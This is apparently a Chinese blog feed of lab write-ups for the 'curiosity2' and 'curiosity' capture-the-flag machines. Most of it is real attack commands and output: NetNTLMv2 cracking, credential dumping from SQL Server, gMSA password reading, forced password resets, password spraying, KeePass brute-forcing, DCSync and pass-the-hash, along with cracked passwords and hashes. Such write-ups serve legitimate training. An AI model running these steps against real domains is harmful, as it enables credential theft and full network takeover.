APPOLONIA::cons:49ad08d5b95f487e:7981c671b6509ffed9036cb51727f74d:010100000000000080a60b552d4bdb01cec743a0ed3c72f20000000002000800380035005200410001001e00570049004e002d0054004b005a00410054004a0045004c0049003200440004003400570049004e002d0054004b005a00410054004a0045004c004900320044002e0038003500520041002e004c004f00430041004c000300140038003500520041002e004c004f00430041004c000500140038003500520041002e004c004f00430041004c000700080080a60b552d4bdb0106000400020000000800300030000000000000000000000000400000f8ac0ec0c53e58ec88b9f6134d5f79aea985e41e98ee06169deb1e85f052d0610a0010000000000000000000000000000000000009001c0063006900660073002f00530051004c00730065007200760065007200000000000000000000000000:5umm3r@

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: APPOLONIA::cons:49ad08d5b95f487e:7981c671b6509ffed9...000000
Time.Started.....: Mon Dec 16 16:25:24 2024 (0 secs)
Time.Estimated...: Mon Dec 16 16:25:24 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/seclists/Passwords/seasons.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1764.7 kH/s (1.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/5390 (75.99%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/5390 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $pr1ng -&gt; W1NT3R2021@
Hardware.Mon.#1..: Util: 12%

Started: Mon Dec 16 16:25:23 2024
Stopped: Mon Dec 16 16:25:25 2024



SQLDB::cons:d7ed9707c16853ff:95d5f1d9d93d1c77a5c6b4e03b2bacdc:010100000000000080a60b552d4bdb017f14781ef42811660000000002000800380035005200410001001e00570049004e002d0054004b005a00410054004a0045004c0049003200440004003400570049004e002d0054004b005a00410054004a0045004c004900320044002e0038003500520041002e004c004f00430041004c000300140038003500520041002e004c004f00430041004c000500140038003500520041002e004c004f00430041004c000700080080a60b552d4bdb0106000400020000000800300030000000000000000000000000400000f8ac0ec0c53e58ec88b9f6134d5f79aea985e41e98ee06169deb1e85f052d0610a001000000000000000000000000000000000000900240063006900660073002f00530051004c004400610074006100620061006200610073006500000000000000000000000000:au7umn@

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQLDB::cons:d7ed9707c16853ff:95d5f1d9d93d1c77a5c6b4...000000
Time.Started.....: Mon Dec 16 16:26:39 2024 (0 secs)
Time.Estimated...: Mon Dec 16 16:26:39 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/seclists/Passwords/seasons.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1785.6 kH/s (1.52ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/5390 (75.99%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/5390 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $pr1ng -&gt; W1NT3R2021@
Hardware.Mon.#1..: Util: 12%

Started: Mon Dec 16 16:26:39 2024
Stopped: Mon Dec 16 16:26:41 2024


<br>成功获取到了两个账号密码<br>SQLDB ： au7umn@ <br>
APPOLONIA ： 5umm3r@<br>测试后两个都可以登录上去<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# evil-winrm -i 192.168.56.116 -u APPOLONIA -p '5umm3r@'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\appolonia\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# evil-winrm -i 192.168.56.116 -u SQLDB -p 'au7umn@'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

<br><br>获取数据库信息<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL
    SQLEXPRESS    REG_SZ    MSSQL15.SQLEXPRESS
<br>数据库名字是 SQLEXPRESS 但完整的名字是 WIN-C73PROQLRHL\SQLEXPRESS<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -Q 'select @@version;'

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)

(1 rows affected)\
<br>查询数据库名称<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -Q 'SELECT name FROM master.dbo.sysdatabases;'
name
--------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
CredentialsDB
toolsdb

(6 rows affected)

<br>里面有一个 CredentialsDB 数据库 里面可能有我们可以利用的 查看一下<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -d CredentialsDB -Q "SELECT * FROM dbo.Credentials;"
ID          Username                                           Password
----------- -------------------------------------------------- ----------------------------------------------------------------------------------------------------
          1 sqlsvc                                             a6d888301de7aa3b380a691d32837627

(1 rows affected)

<br>破解一下这个md5<br>a6d888301de7aa3b380a691d32837627:$PRING2021#
<br>获取到 sqlsvc 用户的密码 $PRING2021#<br>
收集一下域内信息<br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# netexec ldap 192.168.56.116 -u 'SQLDB' -p 'au7umn@'  --bloodhound --collection All --dns-server 192.168.56.116
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False)
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\SQLDB:au7umn@
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  Resolved collection methods: acl, group, localadmin, psremote, trusts, objectprops, session, rdp, dcom, container
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  Done in 00M 00S
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  Compressing output into /root/.nxc/logs/WIN-C73PROQLRHL_192.168.56.116_2024-12-16_165009_bloodhound.zip

<br>使用 netexec 收集失败。可能是那里出了问题<br>
直接传SharpHound.exe 上去收集<br>*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; upload /home/kali/thl/curiosity2/SharpHound.exe

Info: Uploading /home/kali/thl/curiosity2/SharpHound.exe to C:\Users\sqlsvc\Documents\SharpHound.exe

Data: 1395368 bytes of 1395368 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; ls


    Directory: C:\Users\sqlsvc\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/31/2024   6:23 PM           2231 Database.kdbx
-a----       12/16/2024   4:55 PM        1046528 SharpHound.exe


*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; ./SharpHound.exe
2024-12-16T16:55:38.5773646+01:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-12-16T16:55:39.0929517+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-12-16T16:55:39.4209905+01:00|INFORMATION|Initializing SharpHound at 16:55 on 16/12/2024
2024-12-16T16:55:42.0303498+01:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for cons.thl : WIN-C73PROQLRHL.cons.thl
2024-12-16T16:55:42.1237157+01:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-12-16T16:55:42.5300046+01:00|INFORMATION|Beginning LDAP search for cons.thl
2024-12-16T16:55:42.6708951+01:00|INFORMATION|Producer has finished, closing LDAP channel
2024-12-16T16:55:42.6868321+01:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-12-16T16:56:12.8426741+01:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2024-12-16T16:56:29.4678294+01:00|INFORMATION|Consumers finished, closing output channel
2024-12-16T16:56:29.5152889+01:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-12-16T16:56:29.8740248+01:00|INFORMATION|Status: 192 objects finished (+192 4.085106)/s -- Using 42 MB RAM
2024-12-16T16:56:29.8740248+01:00|INFORMATION|Enumeration finished in 00:00:47.3672286
2024-12-16T16:56:30.0931388+01:00|INFORMATION|Saving cache with stats: 152 ID to type mappings.
 152 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-12-16T16:56:30.1869703+01:00|INFORMATION|SharpHound Enumeration Completed at 16:56 on 16/12/2024! Happy Graphing!
*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; ls


    Directory: C:\Users\sqlsvc\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/16/2024   4:56 PM          16777 20241216165628_BloodHound.zip
-a----       10/31/2024   6:23 PM           2231 Database.kdbx
-a----       12/16/2024   4:56 PM          22359 NzAyMzNmYzYtYzFjNi00MDYxLTg5ZTYtY2FmOWMwODg1MzZm.bin
-a----       12/16/2024   4:55 PM        1046528 SharpHound.exe


*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; download 20241216165628_BloodHound.zip

Info: Downloading C:\Users\sqlsvc\Documents\20241216165628_BloodHound.zip to 20241216165628_BloodHound.zip

Info: Download successful!

<br>
在收集时发现当前文件夹下面有一个 Database.kdbx 我们将其下载下来<br>
.kdbx 是 KeePass 密码管理器使用的一种加密数据库文件格式。是 KeePass 2.x 及更高版本使用的数据库文件格式
<br>我们当前用户 SQLSVC 是属于 SVCACCOUNTS 组<br>
<img alt="Pasted image 20241216170557" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png" referrerpolicy="no-referrer"><br>
而且该组可以读取 GMSA_SQL$ 机器用户的密码<br>
<img alt="Pasted image 20241216170702" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170702.png" referrerpolicy="no-referrer"><br>获取密码<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# nxc ldap 192.168.56.116 -u 'sqlsvc' -p '$PRING2021#' --gmsa
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False)
LDAPS       192.168.56.116  636    WIN-C73PROQLRHL  [+] cons.thl\sqlsvc:$PRING2021#
LDAPS       192.168.56.116  636    WIN-C73PROQLRHL  [*] Getting GMSA Passwords
LDAPS       192.168.56.116  636    WIN-C73PROQLRHL  Account: GMSA_SQL$            NTLM: 1ac0f76a248b111e724b9ca39da34988

<br>分析该机器用户的权限可以发现可以修改另一个用户的密码<br>
<img alt="Pasted image 20241216171032" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216171032.png" referrerpolicy="no-referrer"><br>
修改密码<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# impacket-changepasswd CONS.THL/toolsdb@cons.thl -newpass 'admin!@#45' -altuser "GMSA_SQL$" -althash ':1ac0f76a248b111e724b9ca39da34988' -no-pass -reset
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Setting the password of CONS.THL\toolsdb as CONS.THL\GMSA_SQL$
[*] Connecting to DCE/RPC as CONS.THL\GMSA_SQL$
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
<br>根据这个名字<br><br>登录 toolsdb 用户 ，根据这个用户名就能猜测出多半这个用户数据库里面是有东西的，而且载上面数据库查询时时发现有一个 toolsdb 数据库 但是我们当时用户没有权限查询<br>利用这个用户查看 toolsdb 数据库的内容<br>
查看数据库表名<br>*Evil-WinRM* PS C:\Users\toolsdb\Documents&gt; sqlcmd -E -S "localhost\SQLEXPRESS" -d "toolsdb" -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
TABLE_NAME
--------------------------------------------------------------------------------------------------------------------------------
users

(1 rows affected)

<br>查看users表的内容<br>*Evil-WinRM* PS C:\Users\toolsdb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -d toolsdb -Q "SELECT * FROM users;"
id          username                                           password
----------- -------------------------------------------------- --------------------------------------------------
          1 user_6B482050                                      433129A1!@1
          2 user_47F7501A                                      64409A1C!@1
          3 user_515A0C58                                      CAD616E3!@1
          4 user_CA843BF2                                      731C60AD!@1
          5 user_AA2B9FF8                                      8E181E5F!@1
          6 user_F6E6A108                                      47862562!@1
          7 user_8D56BAE8                                      425B6335!@1
          8 user_BA9B1295                                      E4FC1AC4!@1
          9 user_66B7DBEE                                      4EE216A3!@1
         10 user_E75B7C23                                      4CD89A92!@1

(10 rows affected)

<br><br>将这些密码存在一个文件里面作为字典<br>
然后使用rpcclient获取域内所有的用户<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# rpcclient -U "Appolonia%5umm3r@" 192.168.56.116 -c 'enumdomusers'|cut -d '[' -f2|cut -d ']' -f1 &gt;dbuser.txt
<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# crackmapexec smb cons.thl -u dbuser.txt  -p userdb_pass --continue-on-success
SMB         cons.thl        445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False)
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:433129A1!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:64409A1C!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:CAD616E3!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:731C60AD!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:8E181E5F!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:47862562!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:425B6335!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:E4FC1AC4!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:4EE216A3!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:4CD89A92!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Guest:433129A1!@1 STATUS_LOGON_FAILURE

...
<br>全部失败了<br>可能这个密码不是这些用户的<br><br>有可能是我们之前获取的kdbx文件数据库的密码<br>
利用工具进行爆破<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/r3nt0n/keepass4brute" target="_blank">https://github.com/r3nt0n/keepass4brute</a><br>
需要先安装前置环境<br>add-apt-repository -y ppa:phoerious/keepassxc
apt update &amp;&amp; sudo apt install keepassxc
<br>爆破密码<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# ./keepass4brute.sh Database.kdbx userdb_pass
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 5/9 - Attempts per minute: 0 - Estimated time remaining: Calculating...
[+] Current attempt: 8E181E5F!@1

[*] Password found: 8E181E5F!@1

<br>成功获取到数据库的密码 8E181E5F!@1<br>查看数据库文件内容<br>
<img alt="Pasted image 20241216181212" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216181212.png" referrerpolicy="no-referrer"><br>
可以发现有 MSOL 用户的密码 YRax2Ry8g2ITQ3hpRPze<br><br>分析 MSOL 用户，发现可以执行DCSync攻击<br>
<img alt="Pasted image 20241216181401" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216181401.png" referrerpolicy="no-referrer"><br>┌──(root㉿kali)-[/home/…/thl/curiosity2/impacket-master/impacket]
└─# impacket-secretsdump MSOL:'YRax2Ry8g2ITQ3hpRPze'@WIN-C73PROQLRHL.cons.thl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a6c4014f622dcadd4ec24cec540aaa86:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
cons.thl\sqlsvc:1104:aad3b435b51404eeaad3b435b51404ee:17e75629f370f459434786808006cac1:::
cons.thl\jwats:1105:aad3b435b51404eeaad3b435b51404ee:197c3e98518a436666dbe95d78dc87a6:::

...
<br>pth上去获取flag<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# evil-winrm -i 192.168.56.116 -u Administrator -H '5d48bcf84aea999fb1ade06970a81237'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
cons\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type root.flag.txt
372a1c39714b6bbcec0f85de5c6c2599

*Evil-WinRM* PS C:\Users\appolonia\documents&gt; type user.flag.txt
de4769769d10f96ae069e9926a10454e

]]></description><link>https://www.c1trus.top/24-渗透/thl/6.curiosity2.html</link><guid isPermaLink="false">24-渗透/THL/6.curiosity2.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[5.curiosity]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. smb空会话检测" data-href="#2.2. smb空会话检测" href="https://www.c1trus.top/about:blank#2.2._smb空会话检测" class="internal-link" target="_self" rel="noopener nofollow">2.2. smb空会话检测</a>
<br><a data-tooltip-position="top" aria-label="2.3. kerbrute爆破域内用户" data-href="#2.3. kerbrute爆破域内用户" href="https://www.c1trus.top/about:blank#2.3._kerbrute爆破域内用户" class="internal-link" target="_self" rel="noopener nofollow">2.3. kerbrute爆破域内用户</a>
<br><a data-tooltip-position="top" aria-label="2.4. NTML中毒攻击" data-href="#2.4. NTML中毒攻击" href="https://www.c1trus.top/about:blank#2.4._NTML中毒攻击" class="internal-link" target="_self" rel="noopener nofollow">2.4. NTML中毒攻击</a>
<br><a data-tooltip-position="top" aria-label="2.5. winrm连接" data-href="#2.5. winrm连接" href="https://www.c1trus.top/about:blank#2.5._winrm连接" class="internal-link" target="_self" rel="noopener nofollow">2.5. winrm连接</a>


<br><a data-tooltip-position="top" aria-label="3. 提权" data-href="#3. 提权" href="https://www.c1trus.top/about:blank#3._提权" class="internal-link" target="_self" rel="noopener nofollow">3. 提权</a>

<br><a data-tooltip-position="top" aria-label="3.1. bloodhound分析域内环境" data-href="#3.1. bloodhound分析域内环境" href="https://www.c1trus.top/about:blank#3.1._bloodhound分析域内环境" class="internal-link" target="_self" rel="noopener nofollow">3.1. bloodhound分析域内环境</a>
<br><a data-tooltip-position="top" aria-label="3.2. 修改 DBA_ADM 用户密码" data-href="#3.2. 修改 DBA_ADM 用户密码" href="https://www.c1trus.top/about:blank#3.2._修改_DBA_ADM_用户密码" class="internal-link" target="_self" rel="noopener nofollow">3.2. 修改 DBA_ADM 用户密码</a>
<br><a data-tooltip-position="top" aria-label="3.3. sqlcmd获取数据库内容" data-href="#3.3. sqlcmd获取数据库内容" href="https://www.c1trus.top/about:blank#3.3._sqlcmd获取数据库内容" class="internal-link" target="_self" rel="noopener nofollow">3.3. sqlcmd获取数据库内容</a>
<br><a data-tooltip-position="top" aria-label="3.4. 解密hash" data-href="#3.4. 解密hash" href="https://www.c1trus.top/about:blank#3.4._解密hash" class="internal-link" target="_self" rel="noopener nofollow">3.4. 解密hash</a>
<br><a data-tooltip-position="top" aria-label="3.5. 分析SQLSVC用户权限" data-href="#3.5. 分析SQLSVC用户权限" href="https://www.c1trus.top/about:blank#3.5._分析SQLSVC用户权限" class="internal-link" target="_self" rel="noopener nofollow">3.5. 分析SQLSVC用户权限</a>


<br><a data-tooltip-position="top" aria-label="4. 约束性委派" data-href="#4. 约束性委派" href="https://www.c1trus.top/about:blank#4._约束性委派" class="internal-link" target="_self" rel="noopener nofollow">4. 约束性委派</a><br>
- <a data-tooltip-position="top" aria-label="4.1. 在分析机器GMSA_SVC$的权限" data-href="#4.1. 在分析机器GMSA_SVC$的权限" href="https://www.c1trus.top/about:blank#4.1._在分析机器GMSA_SVC$的权限" class="internal-link" target="_self" rel="noopener nofollow">4.1. 在分析机器GMSA_SVC$的权限</a><br>
靶机链接<br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
└─# fscan -h 192.168.56.8

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.8:88 open
192.168.56.8:135 open
192.168.56.8:139 open
192.168.56.8:445 open
[*] alive ports len is: 4
start vulscan
[*] NetInfo
[*]192.168.56.8
   [-&gt;]DC
   [-&gt;]192.168.56.8
   [-&gt;]10.16.82.189
   [-&gt;]2409:8760:1e81:10::2:8e3e
   [-&gt;]2001:0:348b:fb58:49f:3950:f5ef:ad42
[*] NetBios 192.168.56.8    [+] DC:HACKME\DC
已完成 4/4
[*] 扫描结束,耗时: 2.061390421s

┌──(root㉿kali)-[/home/kali/thl/curiosity]
└─# nmap -sCV 192.168.56.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 19:23 CST
Nmap scan report for 192.168.56.8
Host is up (0.00014s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-09 17:23:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
MAC Address: 08:00:27:4A:93:90 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-12-09T17:23:46
|_  start_date: 2024-12-09T17:19:49
|_clock-skew: mean: 5h59m57s, deviation: 0s, median: 5h59m57s
|_nbstat: NetBIOS name: DC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:4a:93:90 (Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.26 seconds

<br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
└─# smbmap -u anonymous -H 192.168.56.8

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)

<br>啥都没有<br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
└─# kerbrute userenum -d hackme.thl --dc dc.hackme.thl  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
